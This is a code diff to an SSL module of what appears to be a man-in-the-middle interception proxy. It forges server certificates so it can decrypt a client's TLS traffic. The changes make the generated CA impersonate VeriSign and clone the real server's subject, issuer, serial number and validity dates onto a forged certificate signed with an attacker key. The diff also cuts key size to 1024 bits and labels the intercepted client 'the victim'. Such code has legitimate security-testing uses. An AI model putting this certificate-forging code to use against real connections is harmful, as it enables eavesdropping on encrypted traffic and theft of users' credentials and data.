@@ -11,7 +11,7 @@ import re
 import M2Crypto
 import tempfile
 import traceback
-
+import cert_auth
 
 from x509 import *
 from   pyasn1.codec.der import decoder
@@ -29,7 +29,7 @@ class SSLProtocol(TcpProtocol):
         self.supports = {malloryevt.CSAFTERSS:True, malloryevt.SSCREATE:True}        
     
     def generateRSAKey(self):
-        return M2Crypto.RSA.gen_key(2048, M2Crypto.m2.RSA_F4)
+        return M2Crypto.RSA.gen_key(1024, M2Crypto.m2.RSA_F4)
 
     def makePKey(self, key):
         pkey = M2Crypto.EVP.PKey()
@@ -46,12 +46,15 @@ class SSLProtocol(TcpProtocol):
         req.sign(pkey,'sha1')
         return req
 
-    def makeCert(self, CN, caPkey):
+    def makeCaCert(self, caPkey):
         #ddpkey = req.get_pubkey()
         #sub = req.get_subject()
         
         name = M2Crypto.X509.X509_Name()
-        name.CN = CN+"first"
+        name.CN = "VeriSign Clas 3 Secure Server CA - G2"
+        name.O = "VeriSign, Inc."
+        name.C = "US"
+        name.OU = "Verisign Trust Network"
 
         cert = M2Crypto.X509.X509()
         cert.set_serial_number(1)
@@ -59,8 +62,10 @@ class SSLProtocol(TcpProtocol):
         cert.set_subject(name)
         
         issuer = M2Crypto.X509.X509_Name()
-        issuer.CN = CN+"second"
-        issuer.O = CN+"third"
+        issuer.CN = "VeriSign Class 3 Secure Server CA - G2"
+        issuer.O = "VeriSign, Inc."
+        issuer.C = "US"
+        issuer.OU = "Verisign Trust Network"
         
         cert.set_issuer(issuer)
         cert.set_pubkey(caPkey)
@@ -72,53 +77,50 @@ class SSLProtocol(TcpProtocol):
         cert.sign(caPkey,'sha1')
         return cert
 
+    def makePeerCert(self, peerSub, peerIss, peerNotAfter, peerNotBefore, peerSerial,
+                     peerKey, caKey, caCert):
+        
+        cert = M2Crypto.X509.X509()
+        cert.set_serial_number(peerSerial)
+        cert.set_version(2)
+        cert.set_subject(peerSub)
+        cert.set_issuer(peerIss)
+        #cert.set_issuer(caCert.get_subject())
+        cert.set_pubkey(peerKey)
+        cert.set_not_after(peerNotAfter)
+        cert.set_not_before(peerNotBefore)
+        cert.sign(caKey,'sha1')
+        return cert
+
     def ca(self):
         key = self.generateRSAKey()
         pkey =  self.makePKey(key)
-        cert = self.makeCert("Test CA 1", pkey)
+        cert = self.makeCaCert(pkey)
         return (cert, pkey)
+
+    def cert(self, peerSub, peerIss, peerNotAfter, peerNotBefore, peerSerial, 
+             caKey, caCert):
+        key= self.generateRSAKey()
+        peerKey = self.makePKey(key)
+        cert = self.makePeerCert(peerSub, peerIss, peerNotAfter,
+                                 peerNotBefore, peerSerial,
+                                 peerKey, caKey, caCert)
+        return (cert,peerKey)
                 
     def configure_client_socket(self):
         """This is the socket from mallory to the victim"""
         self.log.debug("SSLProto: Getting common name from socket")
-        
-
-        caCert, caPkey = self.ca()
-
-
         cert_from_remote_server = self.destination.getpeercert(True)
-        m2crypt_cert = M2Crypto.X509.load_cert_der_string(
+
+        m2_crypto_cert = M2Crypto.X509.load_cert_der_string(
             cert_from_remote_server)
-        len_of_pub_key = m2crypt_cert.get_pubkey().size()
-        
-        self.log.debug("SSLProto: Generating a new key for cert")
-        new_rsa_key = M2Crypto.RSA.gen_key(len_of_pub_key*8,
-            M2Crypto.m2.RSA_F4)
-        pkey = M2Crypto.EVP.PKey()
-        pkey.assign_rsa(new_rsa_key)
-        
-        self.log.debug("SSLProto: Setting new keys in cert and signing")
-        m2crypt_cert.set_pubkey(pkey)
-        m2crypt_cert.set_serial_number(m2crypt_cert.get_serial_number()+100)
-        m2crypt_cert.set_issuer(caCert.get_issuer())
-        m2crypt_cert.sign(caPkey,"sha1") #NEED TO REMOVE FOR STEP 2
-
-        self.log.debug("SSLProto: Making temp cert and key file")
-        tempCer = m2crypt_cert.as_text()
-        tempCer = tempCer + m2crypt_cert.as_pem ()
-        tempCertFile = tempfile.NamedTemporaryFile(delete=False)
-        tempCertFile.write(tempCer)
-        tempCertFile.flush()
-
-        tempKeyFile = tempfile.NamedTemporaryFile(delete=False)
-        tempKeyFile.write(pkey.as_pem(None))
-        tempKeyFile.flush()
-          
+        fake_cert, fake_key = cert_auth.ca.get_fake_cert_and_key_filename(m2_crypto_cert)
         self.log.debug("SSLProto: Starting Socket")
         try:
             self.source = ssl.wrap_socket(self.source,
-              server_side=True, certfile=tempCertFile.name, 
-              keyfile=tempKeyFile.name, 
+              server_side=True, 
+              certfile=fake_cert, 
+              keyfile=fake_key, 
               ssl_version=ssl.PROTOCOL_SSLv23)
         except:
             self.log.debug("SSLProto: Client Closed SSL Connection")
